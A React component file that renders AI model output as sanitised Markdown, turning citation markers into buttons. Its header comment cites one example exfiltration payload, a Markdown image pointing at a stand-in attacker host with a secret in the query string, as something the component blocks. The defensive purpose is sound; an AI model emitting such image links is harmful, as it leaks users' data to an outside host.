"use client";

import type { ComponentProps } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";

/**
 * Model output is untrusted input to the browser:
 * - no raw HTML (react-markdown escapes it; rehype-raw is deliberately absent), so <script> shows as text;
 * - images are never fetched — a placeholder is rendered instead (blocks ![x](https://attacker/?d=secret));
 * - only http(s) and in-page links survive; javascript:/data: URLs are dropped;
 * - "[n]" citation markers become buttons that open the cited passage.
 * The CSP (img-src 'self') is the second layer.
 */
export function Markdown({ text, onCite, maxCitation }: { text: string; onCite?: (n: number) => void; maxCitation?: number }) {
  const withCitations = text.replace(/\[(\d{1,3})\](?!\()/g, (m, n: string) =>
    maxCitation === undefined || Number(n) <= maxCitation ? `[${n}](#cite-${n})` : m,
  );
  const components: Components = {
    img: ({ alt }) => (
      <span className="rounded bg-[var(--color-surface-2)] px-1 text-xs text-[var(--color-muted)]">[image not shown{alt ? `: ${alt}` : ""}]</span>
    ),
    a: ({ href, children }: ComponentProps<"a">) => {
      const cite = href?.match(/^#cite-(\d+)$/);
      if (cite && onCite) {
        const n = Number(cite[1]);
        return (
          <button
            type="button"
            onClick={() => onCite(n)}
            aria-label={`Open source ${n}`}
            className="mx-0.5 inline-flex h-6 min-w-6 items-center justify-center rounded-full bg-[var(--color-accent-soft)] px-1.5 align-text-top text-[11px] font-semibold text-[var(--color-accent)] hover:bg-[var(--color-accent)] hover:text-[var(--color-accent-fg)]"
          >
            {n}
          </button>
        );
      }
      return (
        <a href={href} target="_blank" rel="noopener noreferrer nofollow">
          {children}
        </a>
      );
    },
  };
  return (
    <div className="prose-answer">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[rehypeHighlight]}
        components={components}
        skipHtml
        urlTransform={(url) => (/^(https?:|#)/i.test(url) ? url : "")}
      >
        {withCitations}
      </ReactMarkdown>
    </div>
  );
}
